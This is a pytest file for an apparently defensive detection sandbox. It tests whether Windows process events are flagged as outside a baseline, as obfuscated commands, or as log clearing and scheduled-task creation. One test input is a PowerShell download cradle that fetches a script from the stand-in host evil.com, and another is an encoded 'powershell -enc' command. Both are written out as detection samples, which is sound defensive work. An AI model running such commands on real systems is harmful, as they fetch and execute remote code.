"""Tests for Phase 1 baseline integrity and context-window feature extraction."""

from tmdp_sandbox.context_window import (
    check_baseline_integrity,
    extract_context_features,
)
from tmdp_sandbox.event_spec import EventSpec


def _event(
    process: str = "svchost.exe",
    command: str = "",
    user: str = "SYSTEM",
    event_id: int | None = None,
    label: str = "benign",
) -> EventSpec:
    return EventSpec(
        process_name=process,
        command_line=command,
        user_name=user,
        parent_process="",
        event_id=event_id,
        label=label,
    )


def test_baseline_process_is_in_baseline():
    result = check_baseline_integrity(_event("svchost.exe"))
    assert result.in_baseline is True
    assert result.is_suspicious_process is False


def test_suspicious_process_not_in_baseline():
    result = check_baseline_integrity(_event("powershell.exe"))
    assert result.in_baseline is False
    assert result.is_suspicious_process is True


def test_obfuscated_command_detected_by_enc_flag():
    result = check_baseline_integrity(_event(command="powershell -enc aQBlAHgA"))
    assert result.has_obfuscated_command is True


def test_obfuscated_command_detected_by_download():
    result = check_baseline_integrity(_event(command="powershell -c (new-object net.webclient).downloadstring('http://evil.com')"))
    assert result.has_obfuscated_command is True


def test_plain_command_not_obfuscated():
    result = check_baseline_integrity(_event(command="C:\\Windows\\system32\\svchost.exe -k netsvcs"))
    assert result.has_obfuscated_command is False


def test_context_window_counts_suspicious_processes():
    events = tuple([
        _event("svchost.exe"),
        _event("powershell.exe", label="malicious"),
        _event("cmd.exe", label="malicious"),
        _event("svchost.exe"),
    ])
    features = extract_context_features(events, decision_index=3, window_size=10)
    assert features.suspicious_process_count == 2


def test_context_window_detects_log_clearing():
    events = tuple([
        _event(event_id=1102),  # audit log cleared
        _event("svchost.exe"),
        _event("svchost.exe"),
    ])
    features = extract_context_features(events, decision_index=2, window_size=10)
    assert features.log_cleared_in_window is True


def test_context_window_empty_before_first_event():
    events = tuple([_event("powershell.exe")])
    features = extract_context_features(events, decision_index=0, window_size=10)
    assert features.window_size == 0
    assert features.suspicious_process_count == 0


def test_context_window_respects_window_size():
    # 10 events before decision, window_size=3 should only see last 3
    events = tuple([_event("powershell.exe")] * 10 + [_event("svchost.exe")])
    features = extract_context_features(events, decision_index=10, window_size=3)
    assert features.window_size == 3
    assert features.suspicious_process_count == 3


def test_context_window_counts_suspicious_event_ids():
    events = tuple([
        _event(event_id=4698),  # scheduled task created
        _event(event_id=1102),  # log cleared
        _event("svchost.exe"),
    ])
    features = extract_context_features(events, decision_index=2, window_size=10)
    assert features.suspicious_event_id_count == 2
